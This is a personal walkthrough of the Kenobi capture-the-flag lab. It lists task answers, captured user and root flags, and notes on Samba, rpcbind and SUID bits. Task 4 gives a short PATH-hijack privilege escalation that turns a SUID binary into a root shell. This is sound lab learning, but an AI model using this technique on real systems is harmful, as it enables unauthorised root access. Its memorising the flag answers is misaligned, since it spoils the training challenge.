#HackTheBox Kenobi

#Saikat Karmakar | 23 Nov:2020

# Task 1
1. Scan the machine with nmap, how many ports are open?
```
7
```

#Task 2
1. Using the nmap command above, how many shares have been found?
```
3
```
2. Once you're connected, list the files on the share. What is the file can you see?
```
log.txt
```
3. What port is FTP running on?
```
21
```
4. What mount can we see?
```
/var
```

# Task 3
1. Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.
What is the version?
```
1.3.5 //220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.209.89]
```
2. How many exploits are there for the ProFTPd running?
```
3
```
3. What is Kenobi's user flag (/home/kenobi/user.txt)?
```
d0b0f3f53b6caa532a83915e19224899
```

# Task 4
1. What file looks particularly out of the ordinary? 
```
/usr/bin/menu
```
2. Run the binary, how many options appear?
```
3
```
3. What is the root flag (/root/root.txt)?

echo "/bin/bash -p" > curl
chmod +x curl
echo $PATH //to see the path 
export PATH=/home/kenobi:$PATH //export the path 
/usr/bin/menu //exe the file & get root access
```
177b3cd8562289f37382721c28381f02
```

# Notes 
```
Samba: 
	is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often refereed to as a network file system.

	Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

rpcbind:
	This is just an server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 


Privilege Escalation with Path Variable Manipulation:

	Lets first understand what what SUID, SGID and Sticky Bits are.
	Permission	 On Files	   On Directories
	SUID Bit	 User executes the file with permissions of the file owner	-
	SGID Bit	 User executes the file with the permission of the group owner.
							   File created in directory gets the same group owner.
	Sticky Bit	 No meaning	   Users are prevented from deleting files from other users.

	SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.
```